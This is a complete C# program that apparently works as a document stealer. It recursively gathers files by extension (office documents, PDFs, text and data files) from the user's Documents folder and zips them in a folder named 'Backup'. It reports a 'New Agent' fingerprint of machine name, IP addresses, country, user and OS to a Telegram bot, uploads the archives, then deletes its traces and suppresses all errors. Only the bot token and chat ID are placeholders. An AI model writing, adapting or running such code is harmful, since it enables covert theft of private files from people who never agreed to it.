using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Net.Sockets;
using System.Text.Json;
using System.Threading.Tasks;

class Program
{
    // Settings
    private static readonly string token = "telegram_bot_token";
    private static readonly string chatId = "chatid";
    private static readonly string pathA = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
    private static readonly string pathB = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Backup");
    private static readonly string[] extensions = { ".txt", ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".ods", ".odp", ".rtf", ".csv", ".xml", ".html", ".htm", ".json", ".yaml", ".yml", ".md", ".epub", ".mobi", ".pages", ".key", ".numbers" };
    private const int sizeLimit = 50 * 1024 * 1024;
    private const long maxCompressedSize = 50 * 1024 * 1024;

    static void Main(string[] args)
    {
        Program.MainProgram().GetAwaiter().GetResult();
    }

    static async Task MainProgram()
    {
        // await Task.Delay(TimeSpan.FromMinutes(1));

        Directory.CreateDirectory(pathB);

        string id = GenerateId();

        string[] fileList = GetFiles(pathA);
        List<string> compressedFilesList = BatchCompress(fileList, pathB, id, pathA).ToList();

        await SendInfoToTelegram(id);

        await SendMessageToTelegram("⚠ Sending files...");

        foreach (var compressedFilePath in compressedFilesList)
        {
            await SendFileToTelegram(compressedFilePath);
        }

        await SendMessageToTelegram("⚠️ All files have been sent.");

        CleanUp(compressedFilesList, pathB);
    }

    static async Task SendMessageToTelegram(string message)
    {
        using var client = new HttpClient();
        var content = new StringContent(message);
        await client.PostAsync($"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatId}&text={Uri.EscapeDataString(message)}", content);
    }

    static string GenerateId()
    {
        const string charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        var random = new Random();
        return new string(Enumerable.Repeat(charset, 10).Select(s => s[random.Next(s.Length)]).ToArray());
    }

    static string[] GetFiles(string path)
    {
        try
        {
            string[] currentFiles = Directory.GetFiles(path).Where(file => extensions.Contains(Path.GetExtension(file).ToLower()) && new FileInfo(file).Length <= sizeLimit).ToArray();

            string[][] subdirectoryFiles = Directory.GetDirectories(path).Select(GetFiles).ToArray();

            return currentFiles.Concat(subdirectoryFiles.SelectMany(files => files)).ToArray();
        }
        catch (UnauthorizedAccessException)
        {
            return new string[0];
        }
    }

    static string[] BatchCompress(string[] files, string backupPath, string id, string rootPath)
    {
        var compressedFilePaths = new List<string>();
        int batchIndex = 0;
        long currentBatchSize = 0;
        var currentBatchFiles = new List<string>();

        foreach (var filePath in files)
        {
            long fileSize = new FileInfo(filePath).Length;
            if (currentBatchSize + fileSize > maxCompressedSize)
            {
                string compressedFilePath = CreateCompressedFile(currentBatchFiles, backupPath, batchIndex++, id, rootPath);
                compressedFilePaths.Add(compressedFilePath);
                currentBatchFiles.Clear();
                currentBatchSize = 0;
            }

            currentBatchFiles.Add(filePath);
            currentBatchSize += fileSize;
        }

        if (currentBatchFiles.Count > 0)
        {
            string compressedFilePath = CreateCompressedFile(currentBatchFiles, backupPath, batchIndex, id, rootPath);
            compressedFilePaths.Add(compressedFilePath);
        }

        return compressedFilePaths.ToArray();
    }

    static string CreateCompressedFile(List<string> fileList, string backupPath, int batchIndex, string id, string rootPath)
    {
        string compressedFilePath = Path.Combine(backupPath, $"Files_{id}_{Environment.MachineName}_{DateTime.Now:yyyyMMddHHmmss}_{batchIndex}.zip");

        try
        {
            using var compressedFile = ZipFile.Open(compressedFilePath, ZipArchiveMode.Create);
            foreach (var file in fileList)
            {
                try
                {
                    if (File.Exists(file))
                    {
                        string relativePath = GetRelativePath(rootPath, file);
                        compressedFile.CreateEntryFromFile(file, relativePath);
                    }
                }
                catch (IOException)
                {
                }
                catch (Exception)
                {
                }
            }
        }
        catch (IOException)
        {
        }
        catch (Exception)
        {
        }
        return compressedFilePath;
    }

    static string GetRelativePath(string rootPath, string fullPath)
    {
        var rootUri = new Uri(rootPath);
        var fullUri = new Uri(fullPath);
        return Uri.UnescapeDataString(rootUri.MakeRelativeUri(fullUri).ToString().Replace('/', Path.DirectorySeparatorChar));
    }

    static async Task SendInfoToTelegram(string id)
    {
        string info = await GetInfo(id);
        using var client = new HttpClient();
        var content = new StringContent(info);
        await client.PostAsync($"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatId}&text={Uri.EscapeDataString(info)}", content);
    }

    static async Task<string> GetInfo(string id)
    {
        string localIP = GetLocalIP();
        string publicIP = await GetPublicIP();
        string country = await GetCountry(publicIP);

        return $"☣️ New Agent...\n" +
               $"[ID] {id}\n" +
               $"[Machine Name] {Environment.MachineName}\n" +
               $"[Local IP Address] {localIP}\n" +
               $"[Public IP Address] {publicIP}\n" +
               $"[Country] {country}\n" +
               $"[User] {Environment.UserName}\n" +
               $"[OS Version] {Environment.OSVersion}\n" +
               $"[Local Time] {DateTime.Now}";
    }

    static string GetLocalIP()
    {
        var host = Dns.GetHostEntry(Dns.GetHostName());
        foreach (var ip in host.AddressList)
        {
            if (ip.AddressFamily == AddressFamily.InterNetwork)
            {
                return ip.ToString();
            }
        }
        return "Local IP Address Not Found!";
    }

    static async Task<string> GetPublicIP()
    {
        using var client = new HttpClient();
        return await client.GetStringAsync("https://api.ipify.org");
    }

    static async Task<string> GetCountry(string ip)
    {
        using var client = new HttpClient();
        string response = await client.GetStringAsync($"http://ipwhois.app/json/{ip}");
        using JsonDocument document = JsonDocument.Parse(response);
        return document.RootElement.GetProperty("country").GetString() ?? "Country Not Found";
    }

    static async Task SendFileToTelegram(string filePath)
    {
        try
        {
            using var client = new HttpClient();
            using var form = new MultipartFormDataContent();
            using var fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read);
            var fileContent = new StreamContent(fileStream);
            fileContent.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
            form.Add(fileContent, "document", Path.GetFileName(filePath));
            var response = await client.PostAsync($"https://api.telegram.org/bot{token}/sendDocument?chat_id={chatId}", form);

            if (!response.IsSuccessStatusCode)
            {
            }
        }
        catch (FileNotFoundException)
        {
        }
        catch (Exception)
        {
        }
    }

    static void CleanUp(IEnumerable<string> compressedFilePaths, string backupPath)
    {
        try
        {
            foreach (var compressedFilePath in compressedFilePaths)
            {
                File.Delete(compressedFilePath);
            }
            Directory.Delete(backupPath, true);
        }
        catch (Exception)
        {
        }
    }
}